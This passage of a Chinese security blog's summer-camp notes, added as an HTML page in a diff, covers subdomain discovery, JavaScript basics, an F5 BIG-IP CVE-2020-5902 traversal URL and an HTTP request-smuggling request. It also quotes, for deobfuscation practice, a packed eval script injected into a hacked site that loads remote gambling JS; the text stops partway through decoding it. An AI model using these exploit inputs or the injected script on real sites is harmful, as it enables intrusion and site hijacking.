@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>2021年暑期夏令营笔记(day1-day3) - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="2021年暑期夏令营笔记(day1-day3)" />
+<meta property="og:description" content="0x00 day1 Web 基础课程 泛解析 123.example.com 2389qjlsfa.example.com 所谓“泛域名解析”是指：利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。 挖掘子域 爆破子域 admin mail" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-19T08:59:21+00:00" />
+<meta property="article:modified_time" content="2021-08-19T08:59:21+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="2021年暑期夏令营笔记(day1-day3)"/>
+<meta name="twitter:description" content="0x00 day1 Web 基础课程 泛解析 123.example.com 2389qjlsfa.example.com 所谓“泛域名解析”是指：利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。 挖掘子域 爆破子域 admin mail"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/" /><link rel="prev" href="https://hannibal0x.github.io/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/" /><link rel="next" href="https://hannibal0x.github.io/2021-08-21-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day4-day5/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "2021年暑期夏令营笔记(day1-day3)",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3\/"
+        },"genre": "posts","keywords": "Web安全","wordcount":  5093 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3\/","datePublished": "2021-08-19T08:59:21+00:00","dateModified": "2021-08-19T08:59:21+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">2021年暑期夏令营笔记(day1-day3)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>学习</a>&nbsp;<a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-08-19">2021-08-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;5093 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-day1">0x00 day1</a>
+      <ul>
+        <li><a href="#web-基础课程">Web 基础课程</a></li>
+        <li><a href="#javascript-基础">JavaScript 基础</a>
+          <ul>
+            <li><a href="#js笔记">JS笔记</a></li>
+            <li><a href="#js解密实例">JS解密实例</a></li>
+            <li><a href="#js逆向实例">JS逆向实例</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#0x01-day2">0x01 day2</a></li>
+    <li><a href="#0x02-day3">0x02 day3</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-day1">0x00 day1</h2>
+<h3 id="web-基础课程">Web 基础课程</h3>
+<p><strong>泛解析</strong></p>
+<p>123.example.com</p>
+<p>2389qjlsfa.example.com</p>
+<p>所谓“泛域名解析”是指：利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。</p>
+<p><strong>挖掘子域</strong></p>
+<p>爆破子域 admin mail ftp</p>
+<p>使用收集dns数据的在线网站查找 <a href="https://rapiddns.io/" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://rapiddns.io/" target="_blank" rel="noopener noreffer ">https://rapiddns.io/</a></a></p>
+<p>抓取网站的链接分析</p>
+<p>域名备案搜集资产 <a href="https://beian.miit.gov.cn/" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener noreffer ">https://beian.miit.gov.cn/</a></a></p>
+<p>搜索引擎语法搜索</p>
+<p>whois关联查询</p>
+<p>查询证书<a href="https://crt.sh/" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://crt.sh/" target="_blank" rel="noopener noreffer ">https://crt.sh/</a></a></p>
+<p><strong>工具</strong></p>
+<p>sublist3r&ndash;<a rel="noreferrer noopener" href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="nofollow" ><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener noreffer ">https://github.com/aboul3la/Sublist3r</a></a></p>
+<p>ksubdomain&ndash;<a rel="noreferrer noopener" href="https://github.com/knownsec/ksubdomain" target="_blank" rel="nofollow" ><a href="https://github.com/knownsec/ksubdomain" target="_blank" rel="noopener noreffer ">https://github.com/knownsec/ksubdomain</a></a></p>
+<p>oneforall&ndash;<a rel="noreferrer noopener" href="https://github.com/shmilylty/OneForAll" target="_blank" rel="nofollow" ><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener noreffer ">https://github.com/shmilylty/OneForAll</a></a></p>
+<p><strong>反向代理与服务器的差异导致的问题</strong></p>
+<p><strong>f5-big-ip-CVE-2020-5902</strong></p>
+<p>f5-big-ip 是一个本地流量管理器，常用于确保应用流量的安全，并对应用流量进行优化和负载均衡</p>
+<p>https://ip/tmui/login.jsp</p>
+<p>https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp</p>
+<p>Apache会把 <code>/..;/</code> 当作一个正常目录去对待，而Tomcat会把它当作父目录，当Apache将请求转发到Tomcat时，Tomcat会把它看作是:</p>
+<p>https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp</p>
+<p>https://xxxx/tmui/tmui/locallb/workspace/fileRead.jsp</p>
+<p><strong>http请求走私</strong></p>
+<p>请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头</p>
+<p>前端服务器处理 <code>Content-Length</code> 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 <code>Content-Length</code> ，处理 <code>Transfer-Encoding</code> 。例如</p>
+<pre class="wp-block-code"><code>POST / HTTP/1.1
+Host: example.com
+...
+Connection: keep-alive
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+a</code></pre>
+<h3 id="javascript-基础">JavaScript 基础</h3>
+<h4 id="js笔记">JS笔记</h4>
+<p>HTML嵌入JavaScript的方式：1、事件句柄；2、脚本块；3、引入外部独立的JS文件。</p>
+<p>在JS当中，函数的名字不能重复，当函数重名的时候，后声明的函数会将之前的覆盖。</p>
+<p>当一个变量声明的时候没有使用var关键字，那么不管这个变量是在哪里声明的，都是全局变量。</p>
+<p><strong>常用事件</strong></p>
+<pre class="wp-block-code"><code>blur 失去焦点
+focus 获得焦点
+click 鼠标单击
+dblclick 鼠标双击
+keydown 键盘按下
+keyup 键盘弹起
+mousedown 鼠标按下
+mouseover 鼠标经过
+mousemove 鼠标移动
+mouseout 鼠标离开
+mouseup 鼠标弹起
+reset 表单重置
+submit 表单提交
+change 下拉列表选中项改变，或文本框内容改变
+select 文本被选定
+load 页面加载完毕</code></pre>
+<p><em>任何一个事件都会对应一个事件句柄，事件句柄是在事件前添加on，例如：onclick</em></p>
+<p>JavaScript的三大块</p>
+<ul>
+<li>ECMAScript：JS的核心语法（ES规范/ECMA-262标准）</li>
+<li>DOM：Document Object Model（文档对象模型）
+<ul>
+<li>对网页当中的节点进行增删改查的过程</li>
+<li>HTML文档被当作一棵DOM树来看待例如：<code>var domObj = document.getElementById('id');</code></li>
+</ul>
+</li>
+<li>BOM：Browser Object Moder（浏览器对象模型）
+<ul>
+<li>关闭浏览器窗口、打开新的浏览器窗口、后退、前进、浏览器地址栏上的地址等</li>
+</ul>
+</li>
+</ul>
+<p>DOM和BOM的区别与联系</p>
+<ul>
+<li>BOM的顶级对象是：window</li>
+<li>DOM的顶级对象是：document</li>
+<li>实际上BOM包括DOM</li>
+</ul>
+<p>innerHTML和innerText的区别</p>
+<ul>
+<li>相同点：都是设置元素内部的内容</li>
+<li>不同点：
+<ul>
+<li>innerHTML会把后面的字符串当作一段HTML代码解释并执行</li>
+<li>innerText只会将后面的字符串作为普通字符串来看待</li>
+</ul>
+</li>
+</ul>
+<p>正则表达式对象的创建与调用</p>
+<ul>
+<li>创建方式一<code>var regExp = /正则表达式/flags;</code></li>
+<li>创建方式二（使用内置支持类RegExp）<code>var regExp = new RegExp (&quot;正则表达式&quot;,&quot;flags&quot;);</code><figure class="wp-block-table"></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>flags</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>g</td>
+<td>全局匹配</td>
+</tr>
+<tr>
+<td>i</td>
+<td>区分大小写的匹配</td>
+</tr>
+<tr>
+<td>m</td>
+<td>多行匹配</td>
+</tr>
+</tbody>
+</table>
+<p><em>ES规范制定之后才支持m，当前面是正则表达式时，m不能用，只有前面是普通字符串时才可以使用</em>。</p>
+<h4 id="js解密实例">JS解密实例</h4>
+<p>网站篡改被植入博彩跳转js，view-source:http://www.baoyuhuang.com/</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>beplayer体育app下载-【welcome】<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;keywords&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;beplayer体育app下载-beplayer体育官方版APP下载-beplay下载官网_Beplay体育软件_beplay体育app安卓&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;description&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;【Beplayapp体育下载WWW.bob0897.COM】为您专业提供欧冠、体育、足球等资讯, beplayer体育下载包括:欧冠、奥运、世界杯、亚洲杯、欧洲杯等最精彩的体育赛事和beplayer体育官网投资...&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="k">if</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">toLocaleLowerCase</span><span class="p">().</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;baidu&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span><span class="nb">document</span><span class="p">.</span><span class="nx">title</span> <span class="o">=</span><span class="s2">&#34;鲍鱼的营养价值,鲍鱼批发市场,干鲍鱼价格,即食鲍鱼罐头,鲍鱼的家常做法大全-滋补皇鲍鱼网&#34;</span><span class="p">}&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">k</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">r</span><span class="p">){</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nx">c</span><span class="o">&lt;</span><span class="nx">a</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nx">e</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">c</span><span class="o">/</span><span class="nx">a</span><span class="p">)))</span><span class="o">+</span><span class="p">((</span><span class="nx">c</span><span class="o">=</span><span class="nx">c</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">35</span><span class="o">?</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">c</span><span class="o">+</span><span class="mi">29</span><span class="p">)</span><span class="o">:</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">))};</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span><span class="nb">String</span><span class="p">)){</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span><span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)]</span><span class="o">=</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">||</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span><span class="nx">k</span><span class="o">=</span><span class="p">[</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">]}];</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span><span class="s1">&#39;\\w+&#39;</span><span class="p">};</span><span class="nx">c</span><span class="o">=</span><span class="mi">1</span><span class="p">};</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span><span class="k">if</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span><span class="nx">p</span><span class="o">=</span><span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\b&#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\\b&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">),</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span><span class="k">return</span> <span class="nx">p</span><span class="p">}(</span><span class="s1">&#39;n(f(p,a,c,k,e,r){e=f(c){h c.o(a)};i(!\&#39;\&#39;.j(/^/,q)){l(c--)r[e(c)]=k[c]||e(c);k=[f(e){h r[e]}];e=f(){h\&#39;\\\\w+\&#39;};c=1};l(c--)i(k[c])p=p.j(s t(\&#39;\\\\b\&#39;+e(c)+\&#39;\\\\b\&#39;,\&#39;g\&#39;),k[c]);h p}(\&#39;1[&#34;2&#34;][&#34;3&#34;](\\\&#39;&lt;0 4=&#34;5/6&#34; 7=&#34;8://9.a.b/c.d&#34;&gt;&lt;/0&gt;\\\&#39;);\&#39;,m,m,\&#39;u|v|x|y|z|A|B|C|D|E|F|G|H|I\&#39;.J(\&#39;|\&#39;),0,{}))&#39;</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="s1">&#39;|||||||||||||||function||return|if|replace||while|14|eval|toString||String||new|RegExp|script|window||document|write|type|text|javascript|src|https|www|bob5918|com|bob|js|split&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span><span class="mi">0</span><span class="p">,{}))&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;description&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;滋补皇鲍鱼网是业内权威的的鲍鱼网站，提供鲍鱼的营养价值和功效作用、鲍鱼的批发市场、鲍鱼价格多少钱一斤、鲍鱼选购鉴别、鲍鱼的家常做法吃法、品牌即食鲍鱼罐头购买、鲍鱼图片等相关鲍鱼百科知识。&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;keywords&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;鲍鱼,鲍鱼的做法,鲍鱼价格,鲍鱼批发,鲍鱼批发市场,即食鲍鱼,鲍鱼多少钱一斤,鲍鱼的营养价值,鲍鱼怎么做,鲍鱼网&#34;</span> <span class="p">/&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密第一步</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">    <span class="nb">eval</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">a</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="nx">e</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">c</span> <span class="o">/</span> <span class="nx">a</span><span class="p">)))</span> <span class="o">+</span> <span class="p">((</span><span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span> <span class="o">%</span> <span class="nx">a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">35</span> <span class="o">?</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">c</span> <span class="o">+</span> <span class="mi">29</span><span class="p">)</span> <span class="o">:</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span> <span class="nb">String</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span> <span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">||</span> <span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">k</span> <span class="o">=</span> <span class="p">[</span><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}];</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s1">&#39;\\w+&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">};</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">c</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\b&#39;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;\\b&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span>
